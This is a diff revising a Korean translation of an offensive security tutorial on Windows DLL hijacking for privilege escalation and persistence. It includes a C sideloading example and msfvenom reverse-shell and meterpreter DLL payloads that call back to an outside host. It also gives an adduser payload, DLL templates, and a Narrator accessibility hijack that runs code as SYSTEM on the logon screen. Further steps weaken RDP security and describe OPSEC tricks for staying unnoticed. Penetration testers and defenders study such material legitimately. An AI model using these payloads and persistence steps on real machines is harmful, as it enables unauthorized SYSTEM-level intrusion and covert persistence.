@@ -5,86 +5,86 @@
 
 ## 기본 정보
 
-DLL Hijacking은 신뢰된 애플리케이션이 악성 DLL을 로드하도록 조작하는 것을 말합니다. 이 용어는 **DLL Spoofing, Injection, and Side-Loading** 같은 여러 전술을 포괄합니다. 주로 코드 실행, 지속성 확보, 그리고 드물게 권한 상승에 사용됩니다. 여기서는 권한 상승에 초점을 맞추지만, 하이재킹 방법 자체는 목적에 관계없이 동일합니다.
+DLL Hijacking은 신뢰되는 애플리케이션이 악성 DLL을 로드하도록 조작하는 것을 포함합니다. 이 용어는 **DLL Spoofing, Injection, and Side-Loading** 같은 여러 전술을 포괄합니다. 주로 code execution, persistence 달성 및 덜 흔하게는 privilege escalation에 사용됩니다. 여기서는 escalation에 초점을 맞추지만, hijacking 기법은 목표에 관계없이 일관됩니다.
 
 ### 일반적인 기법
 
-DLL hijacking에는 애플리케이션의 DLL 로드 전략에 따라 다양한 방법이 사용됩니다:
+DLL hijacking에 사용되는 여러 방법들이 있으며, 각 방법의 효과는 애플리케이션의 DLL 로딩 전략에 따라 달라집니다:
 
-1. **DLL Replacement**: 정식 DLL을 악성 DLL로 교체하며, 원래 DLL의 기능을 유지하기 위해 DLL Proxying을 선택적으로 사용할 수 있습니다.
-2. **DLL Search Order Hijacking**: 악성 DLL을 합법 DLL보다 먼저 검색되는 경로에 배치하여 애플리케이션의 검색 패턴을 악용합니다.
-3. **Phantom DLL Hijacking**: 애플리케이션이 없다고 생각하는 필수 DLL을 로드하도록 악성 DLL을 생성합니다.
-4. **DLL Redirection**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 같은 검색 매개변수를 수정하여 애플리케이션이 악성 DLL을 가리키도록 만듭니다.
-5. **WinSxS DLL Replacement**: WinSxS 디렉터리 내에서 정식 DLL을 악성 DLL로 대체하는 방법으로, 종종 DLL side-loading과 관련됩니다.
-6. **Relative Path DLL Hijacking**: 복사된 애플리케이션과 함께 사용자가 제어하는 디렉터리에 악성 DLL을 배치하는 방식으로, Binary Proxy Execution 기법과 유사합니다.
+1. **DLL Replacement**: 진짜 DLL을 악성 DLL로 교체하는 방법이며, 원본 DLL의 기능을 보존하기 위해 선택적으로 DLL Proxying을 사용할 수 있습니다.
+2. **DLL Search Order Hijacking**: 악성 DLL을 합법적인 DLL보다 먼저 검색되는 경로에 배치하여 애플리케이션의 검색 패턴을 악용합니다.
+3. **Phantom DLL Hijacking**: 애플리케이션이 필요한데 존재하지 않는 DLL로 오인하도록 악성 DLL을 만들어 로드하게 합니다.
+4. **DLL Redirection**: 애플리케이션이 악성 DLL을 가리키도록 `%PATH%`나 `.exe.manifest` / `.exe.local` 같은 검색 매개변수를 수정합니다.
+5. **WinSxS DLL Replacement**: WinSxS 디렉터리에서 합법적인 DLL을 악성 DLL로 교체하는 방법으로, 종종 DLL side-loading과 관련됩니다.
+6. **Relative Path DLL Hijacking**: 복사된 애플리케이션과 함께 악성 DLL을 사용자가 제어하는 디렉터리에 배치하는 방법으로, Binary Proxy Execution 기법과 유사합니다.
 
 > [!TIP]
-> HTML staging, AES-CTR configs, 그리고 .NET implants를 DLL sideloading 위에 계층화하는 단계별 체인을 보려면 아래 워크플로를 검토하세요.
+> 단계별 체인으로 HTML staging, AES-CTR configs, 및 .NET implants를 DLL sideloading 위에 겹쳐 적용하는 방법은 아래 워크플로를 참고하세요.
 
 {{#ref}}
 advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## 누락된 DLL 찾기
+## 누락된 Dll 찾기
 
-시스템 내부의 누락된 DLL을 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행한 다음, **다음 2개의 필터**를 설정하는 것입니다:
+시스템 내 누락된 Dll을 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행한 후 **다음 2개의 필터**를 설정하는 것입니다:
 
 ![](<../../../images/image (961).png>)
 
 ![](<../../../images/image (230).png>)
 
-그리고 **파일 시스템 활동(File System Activity)**만 표시하세요:
+그리고 **File System Activity**만 표시합니다:
 
 ![](<../../../images/image (153).png>)
 
-일반적으로 **누락된 DLL을 전반적으로 찾고 있다면** 이 상태로 몇 **초 동안** 실행해 둡니다.\
-특정 실행 파일 안의 **누락된 DLL을 찾고 있다면**, **"Process Name" "contains" `<exec name>`** 같은 추가 필터를 설정하고 실행한 뒤 이벤트 캡처를 중지해야 합니다.
+일반적으로 **missing dlls**를 찾고 있다면 이 상태로 몇 **초** 동안 실행해 둡니다.\
+특정 실행 파일 내의 **missing dll**을 찾고 있다면 **"Process Name" "contains" `<exec name>`** 같은 추가 필터를 설정한 후 실행하고 이벤트 캡처를 중지하세요.
 
-## 누락된 DLL 악용
+## 누락된 Dll 악용
 
-권한을 상승시키려면, 가장 좋은 기회는 권한이 높은 프로세스가 로드하려고 시도할 DLL을 우리가 쓸 수 있는 위치에 쓸 수 있는 경우입니다. 따라서 DLL이 원본 DLL이 있는 폴더보다 먼저 검색되는 폴더에 악성 DLL을 **쓰기**할 수 있거나(특이한 경우), DLL이 검색될 폴더에 쓸 수 있고 원본 **DLL이 어떤 폴더에도 존재하지 않는** 경우가 될 수 있습니다.
+권한 상승을 위해 우리가 가진 가장 좋은 기회는 권한이 있는 프로세스가 로드하려 할 때 **write a dll that a privilege process will try to load** 수 있는 것입니다. 따라서 우리는 **dll is going to be searched** 위치들 중에서 **original dll**이 있는 폴더보다 먼저 검색되는 **folder**에 dll을 **write**할 수 있거나(특이한 경우), dll이 검색되는 어떤 폴더에 쓸 수 있고 원본 **dll doesn't exist** 하는 경우가 있을 수 있습니다.
 
-### DLL 검색 순서
+### Dll 검색 순서
 
-**Microsoft documentation**(https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)에서 DLL이 어떻게 로드되는지 구체적으로 확인할 수 있습니다.
+**Microsoft documentation**에서 DLL이 어떻게 로드되는지 구체적으로 확인할 수 있습니다.
 
-**Windows applications**는 미리 정의된 검색 경로 집합을 따라 특정 순서로 DLL을 찾습니다. 악성 DLL을 이런 디렉터리 중 하나에 전략적으로 배치하면 정식 DLL보다 먼저 로드되어 DLL hijacking 문제가 발생합니다. 이를 방지하는 한 가지 방법은 애플리케이션이 필요한 DLL을 참조할 때 절대 경로를 사용하도록 하는 것입니다.
+Windows applications는 특정 순서로 미리 정의된 검색 경로들을 따라 DLL을 찾습니다. DLL hijacking 문제는 악성 DLL이 이러한 디렉터리 중 하나에 전략적으로 배치되어 진짜 DLL보다 먼저 로드될 때 발생합니다. 이를 방지하려면 애플리케이션이 필요한 DLL을 지정할 때 절대 경로를 사용하도록 해야 합니다.
 
-다음은 32-bit 시스템에서의 **DLL 검색 순서**입니다:
+아래는 32-bit 시스템에서의 **DLL 검색 순서**입니다:
 
 1. 애플리케이션이 로드된 디렉터리.
-2. 시스템 디렉터리. 이 디렉터리 경로를 얻으려면 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용하세요. (_C:\Windows\System32_)
+2. 시스템 디렉터리. 이 디렉터리의 경로는 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용해 얻습니다.(_C:\Windows\System32_)
 3. 16-bit 시스템 디렉터리. 이 디렉터리의 경로를 얻는 함수는 없지만 검색됩니다. (_C:\Windows\System_)
-4. Windows 디렉터리. 이 디렉터리 경로를 얻으려면 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용하세요.
+4. Windows 디렉터리. 이 디렉터리의 경로는 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용해 얻습니다.
 1. (_C:\Windows_)
 5. 현재 디렉터리.
-6. PATH 환경 변수에 나열된 디렉터리들. 이때 **App Paths** 레지스트리 키로 지정된 애플리케이션별 경로는 포함되지 않는다는 점에 유의하세요. **App Paths** 키는 DLL 검색 경로를 계산할 때 사용되지 않습니다.
+6. PATH 환경 변수에 나열된 디렉터리들. 이때 per-application path를 지정하는 **App Paths** 레지스트리 키는 포함되지 않습니다. **App Paths** 키는 DLL 검색 경로를 계산할 때 사용되지 않습니다.
 
-이는 **SafeDllSearchMode**가 활성화된 기본 검색 순서입니다. 이 기능이 비활성화되면 현재 디렉터리가 두 번째로 올라갑니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 만들고 0으로 설정하세요(기본값은 활성화됨).
+이는 **SafeDllSearchMode**가 활성화된 기본 검색 순서입니다. 비활성화하면 현재 디렉터리가 둘째 위치로 상승합니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 생성하고 0으로 설정하세요(기본값은 활성화됨).
 
-[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH** 플래그로 호출되면 검색은 LoadLibraryEx가 로드하는 실행 모듈의 디렉터리에서 시작됩니다.
+[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH** 플래그와 함께 호출되면 검색은 LoadLibraryEx가 로드하는 실행 모듈의 디렉터리에서 시작합니다.
 
-마지막으로, DLL이 이름 대신 절대 경로로 지정되어 로드될 수 있다는 점에 유의하세요. 그 경우 해당 DLL은 그 경로에서만 검색됩니다(해당 DLL이 다른 종속성을 가지는 경우, 그 종속성들은 이름으로 로드된 것처럼 검색됩니다).
+마지막으로, dll이 이름만이 아니라 절대 경로로 지정되어 로드될 수 있다는 점을 유의하세요. 그런 경우 해당 dll은 그 경로에서만 검색됩니다(해당 dll이 종속성을 가질 경우, 그 종속성들은 이름으로 로드된 것처럼 검색됩니다).
 
 검색 순서를 변경하는 다른 방법들도 있지만 여기서는 설명하지 않겠습니다.
 
 ### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath
 
-새로 생성된 프로세스의 DLL 검색 경로에 결정론적으로 영향을 주는 고급 방법은 ntdll의 네이티브 API로 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것입니다. 여기에 공격자가 제어하는 디렉터리를 제공하면, 대상 프로세스가 DLL을 이름으로 해결할 때(절대 경로가 아니고 안전 로드 플래그를 사용하지 않는 경우) 해당 디렉터리에서 악성 DLL을 로드하도록 강제할 수 있습니다.
+새로 생성된 프로세스의 DLL 검색 경로에 결정적으로 영향을 주는 고급 방법은 ntdll의 네이티브 API로 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것입니다. 여기서 공격자가 제어하는 디렉터리를 제공하면, 임포트된 DLL을 이름으로 해석하는(절대 경로가 아니고 safe loading 플래그를 사용하지 않는) 대상 프로세스가 해당 디렉터리에서 악성 DLL을 로드하도록 강제할 수 있습니다.
 
 핵심 아이디어
-- RtlCreateProcessParametersEx로 프로세스 파라미터를 구성하고, 제어 가능한 폴더(예: dropper/unpacker가 위치한 디렉터리)를 가리키는 사용자 지정 DllPath를 제공합니다.
-- RtlCreateUserProcess로 프로세스를 생성합니다. 대상 바이너리가 이름으로 DLL을 해결할 때 로더는 이 제공된 DllPath를 참조하여, 악성 DLL이 대상 EXE와 같은 위치에 있지 않더라도 신뢰할 수 있는 sideloading을 가능하게 합니다.
+- RtlCreateProcessParametersEx로 프로세스 파라미터를 구성하고 제어하는 폴더(예: dropper/unpacker가 위치한 디렉터리)를 가리키는 커스텀 DllPath를 제공합니다.
+- RtlCreateUserProcess로 프로세스를 생성합니다. 대상 바이너리가 DLL을 이름으로 해석할 때 로더는 이 제공된 DllPath를 참조하여, 악성 DLL이 대상 EXE와 같은 위치에 없더라도 신뢰할 수 있는 sideloading을 가능하게 합니다.
 
-주의/제한사항
-- 이는 생성되는 자식 프로세스에 영향을 미치며, 현재 프로세스에만 영향을 미치는 SetDllDirectory와는 다릅니다.
-- 대상은 DLL을 이름으로 import하거나 LoadLibrary해야 합니다(절대 경로가 아니며 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories를 사용하지 않는 경우).
-- KnownDLLs 및 하드코딩된 절대 경로는 하이재킹할 수 없습니다. Forwarded exports와 SxS는 우선순위를 변경할 수 있습니다.
+주의사항/제한사항
+- 이는 생성되는 자식 프로세스에 영향을 미칩니다; 현재 프로세스에만 영향을 주는 SetDllDirectory와는 다릅니다.
+- 대상은 이름으로 DLL을 import하거나 LoadLibrary해야 합니다(절대 경로가 아니며 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories를 사용하지 않는 경우).
+- KnownDLLs와 하드코딩된 절대 경로는 hijack할 수 없습니다. Forwarded exports와 SxS는 우선순위를 변경할 수 있습니다.
 
-간단한 C 예제 (ntdll, wide strings, 간소화된 오류 처리):
+간단한 C 예제 (ntdll, wide strings, 단순화된 에러 처리):
 
 <details>
-<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
+<summary>전체 C 예제: RTL_USER_PROCESS_PARAMETERS.DllPath를 통한 DLL sideloading 강제</summary>
 ```c
 #include <windows.h>
 #include <winternl.h>
@@ -157,69 +157,69 @@ return 0;
 ```
 </details>
 
-운영 사용 예
-- 악성 xmllite.dll (필요한 함수를 export 하거나 실제 DLL을 프록시하는)을 DllPath 디렉토리에 배치합니다.
-- 위 기법을 사용하여 이름으로 xmllite.dll을 조회하는 것으로 알려진 서명된 바이너리를 실행합니다. 로더는 제공된 DllPath를 통해 import 를 해결하고 귀하의 DLL을 sideload 합니다.
+실전 사용 예
+- DllPath 디렉터리에 악성 xmllite.dll(필요한 함수를 export하거나 실제 DLL로 프록시하는)을 배치합니다.
+- 위 기법을 사용해 이름으로 xmllite.dll을 조회하는 것으로 알려진 서명된 바이너리를 실행합니다. 로더는 제공된 DllPath를 통해 import를 해결하고 당신의 DLL을 sideloads 합니다.
 
-이 기법은 실전에서 multi-stage sideloading chains를 구동하는 것으로 관찰되었습니다: 초기 launcher가 helper DLL을 드롭하고, 그 DLL이 커스텀 DllPath를 가진 Microsoft-signed 하며 hijackable한 바이너리를 spawn 하여 스테이징 디렉토리에서 공격자의 DLL을 강제로 로드하게 합니다.
+이 기법은 실전에서 다단계 sideloading 체인을 유발하는 데 관찰되었습니다: 초기 런처가 헬퍼 DLL을 드롭하고, 그 헬퍼가 Microsoft 서명된 hijackable 바이너리를 생성한 뒤 커스텀 DllPath로 스테이징 디렉터리에서 공격자 DLL의 로드를 강제합니다.
 
 
-#### Windows 문서에서의 DLL 검색 순서 예외사항
+#### Exceptions on dll search order from Windows docs
 
-Windows 문서에서는 표준 DLL 검색 순서에 대한 몇 가지 예외를 언급하고 있습니다:
+Windows 문서에는 표준 DLL 검색 순서에 대한 몇 가지 예외가 명시되어 있습니다:
 
-- **이미 메모리에 로드된 것과 이름이 같은 DLL**이 발견되는 경우, 시스템은 일반적인 검색을 우회합니다. 대신 리디렉션과 매니페스트를 확인한 후 기본적으로 이미 메모리에 있는 DLL을 사용합니다. **이 시나리오에서는 시스템이 DLL을 검색하지 않습니다.**
-- 해당 DLL이 현재 Windows 버전에서 **known DLL**로 인식되는 경우, 시스템은 해당 known DLL의 버전과 그에 의존하는 DLL들을 사용하며 **검색 과정을 생략**합니다. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 에 이러한 known DLL 목록이 저장되어 있습니다.
-- **DLL에 의존성이 있는 경우**, 이러한 의존 DLL들에 대한 검색은 초기 DLL이 전체 경로로 식별되었는지 여부와 관계없이 마치 이들이 **모듈 이름(module names)** 으로만 지정된 것처럼 수행됩니다.
+- **이미 메모리에 로드된 것과 이름이 같은 DLL**을 만나면, 시스템은 일반적인 검색을 우회합니다. 대신 리디렉션과 매니페스트를 확인한 후 이미 메모리에 있는 DLL을 기본으로 사용합니다. **이 경우 시스템은 DLL을 검색하지 않습니다**.
+- 현재 Windows 버전에서 **known DLL**로 인식되는 경우, 시스템은 해당 known DLL과 그에 종속된 DLL들을 사용하여 **검색 과정을 생략합니다**. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**에 이러한 known DLL 목록이 저장되어 있습니다.
+- **DLL에 종속성이 있는 경우**, 이 종속 DLL들에 대한 검색은 초기 DLL이 전체 경로로 식별되었는지와 관계없이 **모듈 이름만으로 표시된 것처럼** 수행됩니다.
 
 ### 권한 상승
 
 **요구사항**:
 
-- 서로 다른 권한으로 동작하거나 동작할 예정인 프로세스( horizontal or lateral movement ) 중에서, **DLL이 없는** 프로세스를 식별합니다.
-- **DLL이 검색될** 모든 **디렉터리**에 대해 **쓰기 권한(write access)**이 있는지 확인합니다. 이 위치는 실행 파일의 디렉터리이거나 시스템 경로 내의 디렉터리일 수 있습니다.
+- **다른 권한**으로 동작하거나 동작할 프로세스(수평 이동 또는 측면 이동)가 있으며, 해당 프로세스가 **DLL이 없는 상태**인 것을 식별합니다.
+- **DLL이 검색될** 모든 **디렉터리에 대한 쓰기 권한**이 있는지 확인합니다. 이 위치는 실행 파일의 디렉터리이거나 시스템 경로에 있는 디렉터리일 수 있습니다.
 
-네, 요구조건을 찾는 것은 복잡합니다. 기본적으로 권한이 있는 실행 파일이 DLL이 없는 경우를 찾는 것은 이상하고, 시스템 경로 폴더에 쓰기 권한을 갖는 것은 더 이상합니다(기본적으로 불가능합니다). 하지만 잘못 구성된 환경에서는 가능할 수 있습니다.\
-운이 좋게 요구사항을 충족하는 경우, [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인해 보세요. 이 프로젝트의 **main goal of the project is bypass UAC** 이지만, 해당 Windows 버전에 맞는 Dll hijaking의 **PoC**를 찾을 수 있을 것이며(아마도 쓰기 권한이 있는 폴더의 경로만 변경하면 될 것입니다) 활용할 수 있습니다.
+기본적으로 **권한이 있는 실행 파일에서 DLL이 누락된 것을 찾는 것은 꽤 어렵고**, 시스템 경로 폴더에 **쓰기 권한을 가진 것도 더더욱 이상한 경우**입니다(기본적으로 불가능합니다). 하지만 misconfigured 환경에서는 가능할 수 있습니다.\
+운이 좋게 요구사항을 만족하는 환경을 찾았다면, [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인해보세요. 프로젝트의 **주요 목적이 UAC 우회(bypass UAC)**일지라도, 해당 Windows 버전용 Dll hijacking의 **PoC**를 찾아서(대부분 쓰기 권한이 있는 폴더 경로만 변경하면) 사용할 수 있을 것입니다.
 
-참고로 다음과 같이 **폴더에서 권한을 확인**할 수 있습니다:
+다음과 같이 특정 폴더에서 **권한을 확인할 수 있다는 점을 주의하세요**:
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-그리고 **PATH 내의 모든 폴더 권한을 확인하세요**:
+그리고 **PATH 내부의 모든 폴더 권한을 확인하세요**:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-다음 명령으로 실행 파일의 imports와 dll의 exports를 확인할 수도 있습니다:
+또한 executable의 imports와 dll의 exports를 다음과 같이 확인할 수 있습니다:
 ```bash
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:
+For a full guide on how to **Dll Hijacking을 악용해 권한을 상승시키는 방법** with permissions to write in a **System Path 폴더** check:
 
 
 {{#ref}}
 writable-sys-path-dll-hijacking-privesc.md
 {{#endref}}
 
-### Automated tools
+### 자동화 도구
 
-[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 system PATH 내의 어떤 폴더에 쓰기 권한이 있는지 확인합니다.\
-다른 흥미로운 자동화 도구로 이 취약점을 찾아내는 데 유용한 **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll._이 있습니다.
+[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)은 system PATH 내의 어떤 폴더에 쓰기 권한이 있는지 확인합니다.\
+이 취약점을 발견하는 데 유용한 다른 자동화 도구로는 **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll._ 가 있습니다.
 
-### Example
+### 예시
 
-만약 exploitable scenario를 발견했다면, 이를 성공적으로 악용하기 위해 가장 중요한 것 중 하나는 실행 파일이 해당 dll에서 가져올 모든 함수를 적어도 내보내는 dll을 만드는 것입니다. 어쨌든, Dll Hijacking은 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 또는 [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)으로 권한을 상승시키는 데 유용합니다. 이 실행을 위한 dll hijacking 연구 내부에서 **how to create a valid dll**의 예는 다음에서 찾을 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
-또한, **next sectio**n에는 **templates**로 유용하거나 **dll with non required functions exported**를 생성하는 데 도움이 될 수 있는 몇 가지 **basic dll codes**가 있습니다.
+취약한 시나리오를 찾은 경우, 이를 성공적으로 악용하기 위해 가장 중요한 것 중 하나는 **실행 파일이 해당 dll에서 임포트할 모든 함수를 최소한 내보내는 dll을 생성하는 것**입니다. 또한, Dll Hijacking은 [Medium Integrity level에서 High **(bypassing UAC)**로 권한을 상승시키는 경우](../../authentication-credentials-uac-and-efs/index.html#uac)나 [**High Integrity에서 SYSTEM으로**](../index.html#from-high-integrity-to-system) 권한을 상승시키는 데 유용하다는 점을 유의하세요. 해당 실행 목적의 dll hijacking 연구에서 **valid dll을 생성하는 방법**의 예를 다음에서 확인할 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+또한, **다음 섹션**에서는 **템플릿**으로 활용하거나 **필요하지 않은 함수를 내보낸 dll**을 생성할 때 유용할 수 있는 몇 가지 **기본 dll 코드**를 찾을 수 있습니다.
 
-## **Creating and compiling Dlls**
+## **Dll 생성 및 컴파일**
 
-### **Dll Proxifying**
+### **Dll 프록시화**
 
-기본적으로 **Dll proxy**는 로드될 때 **로드될 때 악성 코드를 실행**할 수 있는 Dll이지만, 모든 호출을 실제 라이브러리로 전달함으로써 **기대대로** **노출**하고 **동작**할 수 있는 Dll입니다.
+기본적으로 **Dll proxy**는 로드될 때 **악성 코드를 실행**할 수 있으면서도, 실제 라이브러리로의 모든 호출을 전달(relay)하여 **노출되고 기대한 대로 동작**할 수 있는 Dll입니다.
 
-With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **실행 파일을 지정하고 라이브러리를 선택**하여 proxify하려는 대상의 proxified dll을 생성하거나, **Dll을 지정**하고 proxified dll을 생성할 수 있습니다.
+도구 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus)를 사용하면 실제로 **실행 파일을 지정하고 프록시할 라이브러리를 선택**하여 **프록시된 dll을 생성**하거나 **Dll을 지정하여 프록시된 dll을 생성할 수 있습니다**.
 
 ### **Meterpreter**
 
@@ -231,13 +231,13 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**사용자 생성 (x86 — x64 버전은 확인되지 않음):**
+**사용자 생성 (x86, x64 버전은 못 봤음):**
 ```bash
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
-### 자신만의
+### 직접 작성
 
-컴파일하는 Dll은 victim process에 의해 로드될 여러 함수를 반드시 **export several functions** 해야 합니다. 이러한 함수들이 존재하지 않으면 **binary won't be able to load** them, 그리고 **exploit will fail**.
+몇몇 경우에 컴파일하는 Dll은 victim process에 의해 로드될 여러 함수를 반드시 **export several functions**해야 한다는 점에 유의하세요. 이러한 함수들이 존재하지 않으면 **binary won't be able to load**하고 **exploit will fail**.
 
 <details>
 <summary>C DLL template (Win10)</summary>
@@ -329,18 +329,18 @@ return TRUE;
 
 ## 사례 연구: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)
 
-Windows Narrator.exe는 시작 시 예측 가능하고 언어별인 localization DLL을 계속 탐색(probe)하며, 해당 DLL은 hijacked되어 arbitrary code execution 및 persistence를 초래할 수 있습니다.
+Windows의 Narrator.exe는 시작 시 예측 가능한 언어별 localization DLL을 검색(probe)하며, 이 DLL을 hijack하여 임의 코드 실행(arbitrary code execution)과 persistence를 얻을 수 있습니다.
 
 Key facts
 - Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
 - Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
-- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.
+- OneCore 경로에 공격자가 제어하는 쓰기 가능한 DLL이 존재하면, 해당 DLL이 로드되고 `DllMain(DLL_PROCESS_ATTACH)`가 실행됩니다. exports는 필요하지 않습니다.
 
 Discovery with Procmon
-- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
-- Start Narrator and observe the attempted load of the above path.
+- 필터: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
+- Narrator를 시작하고 위 경로에 대한 로드 시도를 관찰합니다.
 
-Minimal DLL
+최소한의 DLL
 ```c
 // Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
 BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
@@ -352,40 +352,40 @@ if (r == DLL_PROCESS_ATTACH) {
 return TRUE;
 }
 ```
-OPSEC 무음
-- 단순한 hijack은 UI에서 음성 재생/강조를 발생시킵니다. 조용히 유지하려면, attach 시 Narrator의 스레드를 열거하고 메인 스레드를 열기(`OpenThread(THREAD_SUSPEND_RESUME)`)한 뒤 `SuspendThread`로 일시중단하고, 자신만의 스레드에서 계속 진행하세요. 전체 코드는 PoC를 참조하세요.
+OPSEC silence
+- 단순한 hijack은 음성 재생 및 UI 하이라이트를 발생시킵니다. 조용히 유지하려면, attach 시 Narrator 스레드를 열거하고, 메인 스레드(`OpenThread(THREAD_SUSPEND_RESUME)`)를 얻어 `SuspendThread`로 정지시킨 후 자체 스레드에서 계속 실행하세요. 전체 코드는 PoC를 참조하세요.
 
 Trigger and persistence via Accessibility configuration
 - User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
 - Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
-- 위 설정으로 Narrator를 시작하면 심어진 DLL이 로드됩니다. 보안 데스크톱(로그온 화면)에서 CTRL+WIN+ENTER를 눌러 Narrator를 시작하세요.
+- 위 설정으로 Narrator를 시작하면 심어놓은 DLL이 로드됩니다. 보안 데스크탑(로그온 화면)에서 CTRL+WIN+ENTER를 눌러 Narrator를 시작하면 DLL이 보안 데스크탑에서 SYSTEM 권한으로 실행됩니다.
 
 RDP-triggered SYSTEM execution (lateral movement)
 - Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
-- 호스트에 RDP로 접속한 뒤, 로그온 화면에서 CTRL+WIN+ENTER를 눌러 Narrator를 실행하세요; 보안 데스크톱에서 당신의 DLL이 SYSTEM으로 실행됩니다.
-- RDP 세션이 종료되면 실행도 중단됩니다 — 빠르게 inject/migrate 하세요.
+- 호스트에 RDP로 접속한 뒤, 로그온 화면에서 CTRL+WIN+ENTER를 눌러 Narrator를 실행하면 DLL이 보안 데스크탑에서 SYSTEM으로 실행됩니다.
+- RDP 세션 종료 시 실행이 중단됩니다—즉시 inject/migrate 하세요.
 
 Bring Your Own Accessibility (BYOA)
-- 내장 Accessibility Tool (AT) 레지스트리 항목(예: CursorIndicator)을 복제하고, 임의의 바이너리/DLL을 가리키도록 편집한 후 가져오고 `configuration`을 해당 AT 이름으로 설정할 수 있습니다. 이렇게 하면 Accessibility 프레임워크 하에서 임의 실행을 프록시할 수 있습니다.
+- 내장된 Accessibility Tool(AT) 레지스트리 항목(예: CursorIndicator)을 복제한 뒤, 임의의 바이너리/DLL을 가리키도록 편집하고 가져온 다음 `configuration`을 해당 AT 이름으로 설정할 수 있습니다. 이렇게 하면 Accessibility 프레임워크 하에서 임의의 실행을 프록시할 수 있습니다.
 
 Notes
 - Writing under `%windir%\System32` and changing HKLM values requires admin rights.
